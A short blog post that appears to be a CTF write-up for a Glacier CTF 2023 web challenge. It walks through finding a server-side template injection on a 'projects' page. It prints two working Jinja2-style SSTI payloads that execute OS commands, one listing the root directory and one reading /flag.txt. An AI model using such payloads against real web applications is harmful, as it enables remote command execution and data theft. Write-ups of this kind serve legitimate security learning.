---
author: pl4int3xt
layout: post
title: Glacier CTF 2023
date: '2023-11-25 10:44:23 +0300'
cover: img/cover_images/46.png
description: "Glacier CTF 2023"
categories: [CTF]
---

> I just created my first website! You can even do some calculations! Don't forget to check out my other projects!
author: Chr0x6eOs

We open the website and there is nothing interesting and so we try to check out the other projects 

![img-description](/img/glacier-ctf-2023/1.png)

We are brought to this page and immediately what pops in my brain is SSTI

![img-description](/img/glacier-ctf-2023/2.png)

I try injecting something to see the changes and indeed the website has an SSTI

![img-description](/img/glacier-ctf-2023/3.png)

Next let's check what's in the / directory and we see the file flag.txt using the following payload

```python
{% raw %}{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cd / && ls')['read']()}}{% endraw %}
```


![img-description](/img/glacier-ctf-2023/4.png)

Next we create a payload to read the flag.txt file

```python
{% raw %}{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag.txt')['read']()}}{% endraw %}
```

![img-description](/img/glacier-ctf-2023/5.png)

